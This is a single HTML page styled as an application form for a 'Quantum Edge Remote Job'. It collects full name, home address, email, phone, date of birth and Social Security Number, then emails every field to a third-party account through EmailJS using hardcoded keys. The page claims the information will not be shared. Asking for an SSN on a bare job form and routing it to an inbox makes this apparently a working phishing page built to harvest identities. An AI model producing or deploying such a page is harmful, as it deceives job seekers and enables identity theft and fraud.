<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Remote Job Application </title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #f4f4f9;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding-top: 50px; /* Added padding at the top */
    }

    .form-container {
      background-color: #ffffff;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 100%;
    }

    h1 {
      font-size: 24px;
      font-weight: 600;
      color: #d4af37; /* Golden color */
      margin-bottom: 1.5rem;
      text-align: center;
    }

    .job-title {
      font-size: 18px;
      font-weight: 500;
      color: #333333;
      text-align: center;
      margin-bottom: 1.5rem;
    }

    .form-group {
      margin-bottom: 1rem;
    }

    label {
      display: block;
      font-size: 14px;
      font-weight: 500;
      color: #555555;
      margin-bottom: 0.5rem;
    }

    input[type="text"],
    input[type="email"],
    input[type="tel"],
    input[type="number"],
    input[type="date"],
    input[type="file"] {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #dddddd;
      border-radius: 5px;
      font-size: 14px;
      color: #333333;
      outline: none;
      transition: border-color 0.3s ease;
    }

    input[type="text"]:focus,
    input[type="email"]:focus,
    input[type="tel"]:focus,
    input[type="number"]:focus,
    input[type="date"]:focus,
    input[type="file"]:focus {
      border-color: #d4af37; /* Golden color */
    }

    button {
      width: 100%;
      padding: 0.75rem;
      background-color: #d4af37; /* Golden color */
      color: #ffffff;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: background-color 0.3s ease;
    }

    button::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 300%;
      height: 300%;
      background-color: rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      transform: translate(-50%, -50%) scale(0);
      transition: transform 0.5s ease;
    }

    button:hover::after {
      transform: translate(-50%, -50%) scale(1);
    }

    button:hover {
      background-color: #b89b30; /* Darker golden color */
    }

    .form-note {
      font-size: 12px;
      color: #888888;
      margin-top: 1rem;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h1> APPLICATION FORM </h1>
    <div class="job-title">Applying for: <strong>QUANTUM EDGE REMOTE JOB</strong></div>
    <form id="job-application-form">
      <div class="form-group">
        <label for="full-name">Full Name</label>
        <input type="text" id="full-name" name="full_name" placeholder="John Doe" required>
      </div>
      <div class="form-group">
        <label for="full-name">Mailing Address</label>
        <input type="text" id="Mailing-Address" name="Mailing_Address" placeholder="Full House Address" required>
      </div>
      <div class="form-group">
        <label for="email">Email Address</label>
        <input type="email" id="email" name="email" placeholder="johndoe@example.com" required>
      </div>
      <div class="form-group">
        <label for="phone">Phone Number</label>
        <input type="tel" id="phone" name="phone" placeholder="+1 234 567 890" required>
      </div>
      <div class="form-group">
        <label for="dob">Date of Birth</label>
        <input type="date" id="dob" name="dob" required>
      </div>
      <div class="form-group">
        <label for="ssn">Social Security Number (SSN)</label>
        <input type="text" id="ssn" name="ssn" placeholder="123-45-6789" required>
      </div>
      <div class="form-group">
        <label for="experience">Years of Experience</label>
        <input type="number" id="experience" name="experience" placeholder="5" required>
      </div>
      <button type="submit">Submit Application</button>
    </form>
    <p class="form-note">We respect your privacy. Your information will not be shared.</p>
  </div>

  <!-- Include EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS with your User ID
    (function() {
      emailjs.init('NSTYQ1kgB5LvN1Vbl'); // Replace with your EmailJS User ID
    })();

    // Handle form submission
    document.getElementById('job-application-form').addEventListener('submit', function(event) {
      event.preventDefault();

      // Send form data using EmailJS
      emailjs.sendForm('service_orusq3p', 'template_533pr9g', this)
        .then(function(response) {
          alert('Application submitted successfully!');
          document.getElementById('job-application-form').reset(); // Reset form
          window.location.href = 'success.html'; // Redirect to success page
        }, function(error) {
          alert('Failed to submit application. Please try again.');
        });
    });
  </script>
</body>
</html>
